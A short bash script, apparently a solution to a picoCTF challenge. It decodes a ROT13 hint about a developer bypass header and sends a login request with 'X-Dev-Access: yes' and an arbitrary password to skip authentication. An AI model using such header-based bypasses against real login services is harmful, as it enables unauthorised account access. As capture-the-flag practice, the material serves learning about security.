#!/bin/bash
# The HTML comment "ABGR: ..." is ROT13 for "NOTE: Jack - temporary bypass: use header X-Dev-Access: yes"
curl -s -X POST "http://amiable-citadel.picoctf.net:49810/login" \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email":"ctf-player@picoctf.org","password":"anything"}' | jq .
